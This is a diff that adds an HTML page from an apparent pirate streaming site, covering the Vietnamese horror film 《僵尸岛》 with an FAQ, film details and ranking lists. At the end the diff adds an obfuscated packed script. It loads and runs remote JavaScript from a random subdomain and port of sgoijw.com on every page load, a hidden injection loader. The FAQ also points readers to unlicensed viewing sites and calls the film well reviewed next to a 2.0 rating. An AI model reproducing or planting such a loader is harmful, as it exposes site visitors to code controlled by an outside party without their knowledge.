+            <p style="margin: 0 0 5px;"><b>2.《僵尸岛》是什么时候上映/什么时候开播的？</b></p>
+            <p style="margin: 0 0 5px;">腾讯视频网友：2022年，详细日期可以去<a rel="nofollow" href="https://baike.baidu.com" target="_blank">百度百科</a>查一查。</p>
+            <p style="margin: 0 0 5px;"><b>3.《僵尸岛》主要演员有哪些？</b></p>
+            <p style="margin: 0 0 5px;">爱奇艺网友：主演黄东,Le,Loc,Xuan,Nghi,吕青玄,Oc,Thanh,Van</p>
+            <p style="margin: 0 0 5px;"><b>4.恐怖片《僵尸岛》有多少集？</b></p>
+            <p style="margin: 0 0 5px;">电影吧网友：现在是全集已完结</p>
+            <p style="margin: 0 0 5px;"><b>5.手机版免费在线点播《僵尸岛》有哪些网站？</b></p>
+            <p style="margin: 0 0 5px;">手机电影网网友：电影天堂网、神马电影手机端、神马电影网</p>
+            <p style="margin: 0 0 5px;"><b>6.《僵尸岛》评价怎么样？</b></p>
+            <p style="margin: 0 0 5px;">百度最佳答案：《僵尸岛》评价很好，演员阵容强大，并且演员的演技一直在线，全程无尿点。你也可以登录百度问答获得更多评价。</p>
+        </div>
+    </div>
+</div>
+				<div class="stui-pannel stui-pannel-bg clearfix">
+					<div class="stui-pannel-box">
+						<div class="stui-pannel_hd">
+							<div class="stui-pannel__head active bottom-line clearfix"><h3 class="title"><img src="/template/st2011/statics/icon/icon_30.png"/>《僵尸岛》详情</h3></div>
+						</div>
+						<div class="stui-pannel_bd">
+							<p style="margin: 0 0 5px;">影片名称：僵尸岛</p>
+							<p style="margin: 0 0 5px;">影片别名：未知</p>
+							<p style="margin: 0 0 5px;">影片拼音：jiangshidao</p>
+							<p style="margin: 0 0 5px;">上映时间：2022</p>
+							<p style="margin: 0 0 5px;">国家地区：越南</p>
+							<p style="margin: 0 0 5px;">影片语言：未知</p>
+							<p style="margin: 0 0 5px;">影片类型：恐怖</p>
+							<p style="margin: 0 0 5px;">影片导演：日中</p>
+							<p style="margin: 0 0 5px;">影片主演：黄东,Le,Loc,Xuan,Nghi,吕青玄,Oc,Thanh,Van..</p>
+							<p style="margin: 0 0 5px;">资源类别：</p>
+							<p style="margin: 0 0 5px;">资源更新：HD </p>
+							<p style="margin: 0 0 5px;">总播放数：781次</p>
+							<p style="margin: 0 0 5px;">入库时间：2023-06-29</p>
+							<p style="margin: 0 0 5px;">豆瓣评分：<a href="https://search.douban.com/movie/subject_search?search_text=僵尸岛&cat=1002" target="_blank" rel="nofollow">2.0</a></p>
+							<p style="margin: 0 0 5px;">IMDB评分：<a href="https://www.imdb.com/find?q=&ref_=nv_sr_sm" target="_blank" rel="nofollow"></a></p>
+							<p style="margin: 0 0 5px;">剧情介绍：越南恐怖片《僵尸岛》在2022发行，破晓电影收集了僵尸岛全集免费在线观看、手机mp4免费观看、完整高清云播放等资讯信息，如果你有更好看的未删减无广告的僵尸岛影视资源欢迎联系破晓电影。</p>
+						</div>
+					</div>
+				</div>
+			</div>
+			<div class="col-lg-wide-25 col-xs-1 stui-pannel-side hidden-sm hidden-xs">
+				<div class="stui-pannel stui-pannel-bg clearfix">
+					<div class="stui-pannel-box">
+						<div class="stui-pannel__head active bottom-line clearfix">
+							<h3 class="title"><img src="/template/st2011/statics/icon/icon_12.png"/>热播恐怖片周排行</h3>
+						</div>
+						<div class="stui-pannel_bd">
+							<ul class="stui-vodlist__text clearfix">
+																<li class="bottom-line-dot">
+	<a href="/pd/350960.html" target="_blank" title="恐怖片《她将会》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge badge-first">1</span>她将会    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/314447.html" target="_blank" title="恐怖片《龙潭巨兽》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge badge-second">2</span>龙潭巨兽    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/329644.html" target="_blank" title="恐怖片《咒怨:终结的开始》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge badge-third">3</span>咒怨:终结的开始    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/330645.html" target="_blank" title="恐怖片《非关正义 完结篇》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge">4</span>非关正义 完结篇    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/245257.html" target="_blank" title="恐怖片《秘密图纸》1080P蓝光在线观看">
+		<span class="text-muted pull-right hidden-md">
+			1080P蓝光		</span>
+		<span class="badge">5</span>秘密图纸    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/234705.html" target="_blank" title="恐怖片《盂兰神功》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge">6</span>盂兰神功    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/231490.html" target="_blank" title="恐怖片《墓穴迷城》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge">7</span>墓穴迷城    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/341909.html" target="_blank" title="恐怖片《看护》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge">8</span>看护    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/319832.html" target="_blank" title="恐怖片《夺命来电》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge">9</span>夺命来电    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/329161.html" target="_blank" title="恐怖片《四圣兽之幽魂还愿师》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge">10</span>四圣兽之幽魂还愿师    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/351360.html" target="_blank" title="恐怖片《南方恶魔》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge">11</span>南方恶魔    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/349635.html" target="_blank" title="恐怖片《监视者2022》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge">12</span>监视者2022    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/340158.html" target="_blank" title="恐怖片《秘术世界之玉莲禅音》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge">13</span>秘术世界之玉莲禅音    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/309466.html" target="_blank" title="恐怖片《棋子》1080P蓝光在线观看">
+		<span class="text-muted pull-right hidden-md">
+			1080P蓝光		</span>
+		<span class="badge">14</span>棋子    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/348248.html" target="_blank" title="恐怖片《一千灵异夜之迷宫杀手》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge">15</span>一千灵异夜之迷宫杀手    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/341632.html" target="_blank" title="恐怖片《守尸者》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge">16</span>守尸者    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/339791.html" target="_blank" title="恐怖片《纳粹霸主》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge">17</span>纳粹霸主    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/339409.html" target="_blank" title="恐怖片《蔷花，红莲》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge">18</span>蔷花，红莲    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/298811.html" target="_blank" title="恐怖片《禁闭男童》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge">19</span>禁闭男童    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/249692.html" target="_blank" title="恐怖片《六百英里》1080P蓝光在线观看">
+		<span class="text-muted pull-right hidden-md">
+			1080P蓝光		</span>
+		<span class="badge">20</span>六百英里    </a>
+</li>
+															</ul>
+						</div>
+					</div>
+				</div>
+				<div class="stui-pannel stui-pannel-bg clearfix">
+					<div class="stui-pannel-box">
+						<div class="stui-pannel__head active bottom-line clearfix">
+							<h3 class="title"><img src="/template/st2011/statics/icon/icon_12.png"/>热播恐怖片月排行</h3>
+						</div>
+						<div class="stui-pannel_bd">
+							<ul class="stui-vodlist__text clearfix">
+																<li class="bottom-line-dot">
+	<a href="/pd/353873.html" target="_blank" title="恐怖片《安妮的脸》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge badge-first">1</span>安妮的脸    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/352602.html" target="_blank" title="恐怖片《危笑韩版》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge badge-second">2</span>危笑韩版    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/340007.html" target="_blank" title="恐怖片《死魂灵》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge badge-third">3</span>死魂灵    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/338644.html" target="_blank" title="恐怖片《撕裂游戏》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge">4</span>撕裂游戏    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/327700.html" target="_blank" title="恐怖片《暗房秘密》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge">5</span>暗房秘密    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/340673.html" target="_blank" title="恐怖片《摧花狂魔》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge">6</span>摧花狂魔    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/249708.html" target="_blank" title="恐怖片《传染》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge">7</span>传染    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/349793.html" target="_blank" title="恐怖片《凝弑》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge">8</span>凝弑    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/337575.html" target="_blank" title="恐怖片《复仇女神》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge">9</span>复仇女神    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/326813.html" target="_blank" title="恐怖片《消屍的夜晚》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge">10</span>消屍的夜晚    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/351189.html" target="_blank" title="恐怖片《夺命直播国语》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge">11</span>夺命直播国语    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/279913.html" target="_blank" title="恐怖片《猛鬼街5：猛鬼怪胎》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge">12</span>猛鬼街5：猛鬼怪胎    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/240647.html" target="_blank" title="恐怖片《恐怖故事2》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge">13</span>恐怖故事2    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/233414.html" target="_blank" title="恐怖片《京城81号2》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge">14</span>京城81号2    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/232847.html" target="_blank" title="恐怖片《巨鳄风暴》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge">15</span>巨鳄风暴    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/343279.html" target="_blank" title="恐怖片《那晚他们来敲门》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge">16</span>那晚他们来敲门    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/323157.html" target="_blank" title="恐怖片《彼岸岛 Deluxe》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge">17</span>彼岸岛 Deluxe    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/347777.html" target="_blank" title="恐怖片《黑井》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge">18</span>黑井    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/287784.html" target="_blank" title="恐怖片《恐怖杀人医院》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge">19</span>恐怖杀人医院    </a>
+</li>
+																<li class="bottom-line-dot">
+	<a href="/pd/354882.html" target="_blank" title="恐怖片《闻所未闻》HD在线观看">
+		<span class="text-muted pull-right hidden-md">
+			HD		</span>
+		<span class="badge">20</span>闻所未闻    </a>
+</li>
+															</ul>
+						</div>
+					</div>
+				</div>
+				<div class="stui-pannel stui-pannel-bg clearfix">
+					<div class="stui-pannel-box clearfix">
+						<div class="stui-pannel__head active bottom-line clearfix">
+							<h3 class="title"><img src="/template/st2011/statics/icon/icon_12.png"/>热门影讯</h3>
+						</div>
+						<div class="stui-pannel_bd">
+							<ul class="stui-vodlist__text clearfix">
+																<li >
+									<a class="text-overflow" target="_blank" href="/pad/161095.html" title="影视资讯-“哈利·波特”主演犯罪片《天才计划》亮相搜狐影展 观众赞情节刺激悬念十足"><span class="badge badge-first">1</span>“哈利·波特”主演犯罪片《天才计划》亮相搜狐影展 观众赞情节刺激悬念十足</a>
+								</li>
+																<li class="top-line-dot">
+									<a class="text-overflow" target="_blank" href="/pad/161056.html" title="影视资讯-《暗恋·橘生淮南》改编自八月长安振华系列，辛云来雨天贴心送伞"><span class="badge badge-second">2</span>《暗恋·橘生淮南》改编自八月长安振华系列，辛云来雨天贴心送伞</a>
+								</li>
+																<li class="top-line-dot">
+									<a class="text-overflow" target="_blank" href="/pad/161055.html" title="影视资讯-《目中无人》讲述身怀绝技的盲眼“捉刀人”成瞎子，刘伟强等人发文力赞"><span class="badge badge-third">3</span>《目中无人》讲述身怀绝技的盲眼“捉刀人”成瞎子，刘伟强等人发文力赞</a>
+								</li>
+																<li class="top-line-dot">
+									<a class="text-overflow" target="_blank" href="/pad/160621.html" title="影视资讯-Phat!《在魔王城说晚安》栖夜莉丝公主粘土人"><span class="badge ">4</span>Phat!《在魔王城说晚安》栖夜莉丝公主粘土人</a>
+								</li>
+																<li class="top-line-dot">
+									<a class="text-overflow" target="_blank" href="/pad/159452.html" title="影视资讯-《侏罗纪世界3》成都首映 主创独家问候中国观众"><span class="badge ">5</span>《侏罗纪世界3》成都首映 主创独家问候中国观众</a>
+								</li>
+																<li class="top-line-dot">
+									<a class="text-overflow" target="_blank" href="/pad/159354.html" title="影视资讯-坎城影展最佳导演朴赞郁携手汤唯、朴海日《分手的决心》竞赛片中坎城场刊得分最高! 7月22日在台上映"><span class="badge ">6</span>坎城影展最佳导演朴赞郁携手汤唯、朴海日《分手的决心》竞赛片中坎城场刊得分最高! 7月22日在台上映</a>
+								</li>
+																<li class="top-line-dot">
+									<a class="text-overflow" target="_blank" href="/pad/158609.html" title="影视资讯-电影《目中无人》曝首支预告 盲眼“捉刀人”复仇"><span class="badge ">7</span>电影《目中无人》曝首支预告 盲眼“捉刀人”复仇</a>
+								</li>
+																<li class="top-line-dot">
+									<a class="text-overflow" target="_blank" href="/pad/158425.html" title="影视资讯-亲子动画电影《开心超人之英雄的心》六一超前点映 圆娃超人梦拯救不开心"><span class="badge ">8</span>亲子动画电影《开心超人之英雄的心》六一超前点映 圆娃超人梦拯救不开心</a>
+								</li>
+																<li class="top-line-dot">
+									<a class="text-overflow" target="_blank" href="/pad/156962.html" title="影视资讯-韩国济州&#038;襄阳国际机场6月1日起重启外国人免签入境政策！快去寻找《我们的蓝调时光》同款取景地吧"><span class="badge ">9</span>韩国济州&#038;襄阳国际机场6月1日起重启外国人免签入境政策！快去寻找《我们的蓝调时光》同款取景地吧</a>
+								</li>
+																<li class="top-line-dot">
+									<a class="text-overflow" target="_blank" href="/pad/156465.html" title="影视资讯-Jordan与《火影忍者》合作推出Zion Williamson鞋款 岸本齐史赠送「忍者Zion」绘图"><span class="badge ">10</span>Jordan与《火影忍者》合作推出Zion Williamson鞋款 岸本齐史赠送「忍者Zion」绘图</a>
+								</li>
+																<li class="top-line-dot">
+									<a class="text-overflow" target="_blank" href="/pad/156107.html" title="影视资讯-被军队耽误的Rapper！「尹尚基」即兴Rap创造《军检察官多伯曼》名场面，和都倍万的Bromance也让人难忘"><span class="badge ">11</span>被军队耽误的Rapper！「尹尚基」即兴Rap创造《军检察官多伯曼》名场面，和都倍万的Bromance也让人难忘</a>
+								</li>
+																<li class="top-line-dot">
+									<a class="text-overflow" target="_blank" href="/pad/156005.html" title="影视资讯-剧场版《弦音 风舞高中弓道部》宣传绘公开"><span class="badge ">12</span>剧场版《弦音 风舞高中弓道部》宣传绘公开</a>
+								</li>
+																<li class="top-line-dot">
+									<a class="text-overflow" target="_blank" href="/pad/155452.html" title="影视资讯-科技感十足！蕾雅·赛杜《未来罪行》发布新预告"><span class="badge ">13</span>科技感十足！蕾雅·赛杜《未来罪行》发布新预告</a>
+								</li>
+																<li class="top-line-dot">
+									<a class="text-overflow" target="_blank" href="/pad/154826.html" title="影视资讯-《奇异博士2》北美开预售 超《蝙蝠侠》年度第一"><span class="badge ">14</span>《奇异博士2》北美开预售 超《蝙蝠侠》年度第一</a>
+								</li>
+																<li class="top-line-dot">
+									<a class="text-overflow" target="_blank" href="/pad/154667.html" title="影视资讯-《二十五，二十一》金泰梨：「很荣幸能够演出罗希度这个帅气的孩子！」"><span class="badge ">15</span>《二十五，二十一》金泰梨：「很荣幸能够演出罗希度这个帅气的孩子！」</a>
+								</li>
+																<li class="top-line-dot">
+									<a class="text-overflow" target="_blank" href="/pad/151555.html" title="影视资讯-传索尼买下了Konami一个“非常流行的IP”"><span class="badge ">16</span>传索尼买下了Konami一个“非常流行的IP”</a>
+								</li>
+																<li class="top-line-dot">
+									<a class="text-overflow" target="_blank" href="/pad/151055.html" title="影视资讯-太害羞啦!《三十九》延宇振首度挑战情欲禁忌电影《为人民服务》! 3月25日全台上映"><span class="badge ">17</span>太害羞啦!《三十九》延宇振首度挑战情欲禁忌电影《为人民服务》! 3月25日全台上映</a>
+								</li>
+																<li class="top-line-dot">
+									<a class="text-overflow" target="_blank" href="/pad/149020.html" title="影视资讯-众海世纪（厦门）影业重磅出品，《重度催眠》电影将于3月份开机"><span class="badge ">18</span>众海世纪（厦门）影业重磅出品，《重度催眠》电影将于3月份开机</a>
+								</li>
+																<li class="top-line-dot">
+									<a class="text-overflow" target="_blank" href="/pad/148276.html" title="影星资讯-华晨宇感谢粉丝为自己庆生 连续九年穿同样衣服"><span class="badge ">19</span>华晨宇感谢粉丝为自己庆生 连续九年穿同样衣服</a>
+								</li>
+																<li class="top-line-dot">
+									<a class="text-overflow" target="_blank" href="/pad/148248.html" title="影视资讯-三上真司或暗示《幽灵线：东京》将登陆Xbox平台"><span class="badge ">20</span>三上真司或暗示《幽灵线：东京》将登陆Xbox平台</a>
+								</li>
+															</ul>
+						</div>
+					</div>
+				</div>
+			</div>
+        </div>
+    </div>
+    <script type="text/javascript">
+		if(playerhigh==1){
+			$(".MacPlayer").addClass("embed-responsive embed-responsive-16by9").css({"padding-bottom":"56.25%","z-index":"99"});
+			$("#playleft,.dplayer-video-wrap").css({"position":"inherit","overflow":"initial"});
+		}
+		var PlayerHeight = $(".MacPlayer").outerHeight();
+		$(".stui-player__video").css("height",PlayerHeight);
+		var playli = $(".stui-content__playlist:first li").length;
+    	if(playcolumn>1){
+    		if(playli>5){
+    			$(".stui-content__playlist").addClass("column"+playcolumn);
+    		}
+    	}
+    	/* if(playli>30){
+			$(".stui-content__playlist").css({"max-height":" 300px","overflow-y":"scroll"});
+		}  */
+	</script>
+	<div class="container">
+	<div class="row">
+		<div class="stui-foot text-muted clearfix">
+            <div class="col-pd text-center">
+                <a target="_blank" href="/rss.xml">RSS订阅</a><span class="split-line"></span>
+                <a target="_blank" href="/rss/baidu.xml">百度蜘蛛</a><span class="split-line"></span>
+                <a target="_blank" href="/rss/sm.xml">神马爬虫</a><span class="split-line"></span>
+                <a target="_blank" href="/rss/sogou.xml">搜狗蜘蛛</a><span class="split-line"></span>
+                <a target="_blank" href="/rss/google.xml">谷歌地图</a><span class="split-line hidden-xs"></span>
+                <a target="_blank" href="/rss/bing.xml" class="hidden-xs">必应爬虫</a><span class="split-line hidden-xs"></span>
+                <a target="_blank" href="/rss/so.xml" class="hidden-xs">奇虎地图</a></a>
+            </div>
+			<div class="col-pd text-center">免責聲明：若本站收錄的資源侵犯了您的權益，請發郵件至：我們會及時刪除侵權內容，謝謝合作！</div>
+			<div class="col-pd text-center">Copyright © 2019-2022 破晓电影 Inc. All Rights Reserved.</div>
+		</div>
+	</div>
+</div>
+<ul class="stui-extra clearfix">
+	<li><a style="-webkit-filter:drop-shadow(3px 3px 3px rgba(0,0,0,.3));filter:drop-shadow(3px 3px 3px rgba(0,0,0,.5));display:none;border-radius:25px;" class="backtop" href="javascript:scroll(0,0)" style=""><i class="icon iconfont icon-less"></i></a></li>
+</ul>
+<div><script type='text/javascript'>new Function(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('6 4={l:\'0\',7:\'\',j:\'/K\',o:\'J.I\',f:[\'G\',\'H\',\'L\',\'M\',\'R\',\'Q\',\'P\',\'N\',\'O\',\'F\',\'E\',\'t\',\'x\',\'v\',\'u\',\'w\',\'y\',\'D\',\'C\',\'B\',\'z\',\'A\',\'S\']};6 n=9 e().d();6 k=4.f[g.X(g.12()*(4.f.15-1))];4.7=4.7==""?n+"."+4.o+":"+k:4.7;c=4.7+4.j;V(4.l==2||(/(Z)/i.18(U.10))){3.5(\'<8 r=\');3.5(\'h\');3.5(\'Y\');3.5(\'p\');3.5(\'s:\');3.5(\'//\');3.5(c+"q"+9 e().d());3.5(\'><\\/8>\')}17{(14(){6 m=3.13("8");6 a=\'W://\'+c;m.r=a+"q"+9 e().d();6 b=3.T("8")[0];b.16.11(m,b)})()}',62,71,'|||document|_0xshowconf|write|var|rd|script|new|||_0xshowurl|getTime|Date|po|Math|||ju|_0xpo|st||_0xhd|cd||_|src||4050|4080|4070|4090|4060|4010|4014|4015|4013|4012|4011|4040|4039|4030|4031|com|sgoijw|wap_1955_2127|4032|4033|4037|4038|4036|4035|4034|4016|getElementsByTagName|navigator|if|https|round|tt|Android|userAgent|insertBefore|random|createElement|function|length|parentNode|else|test'.split('|'),0,{}))();</script></div>
+</body>
+</html>
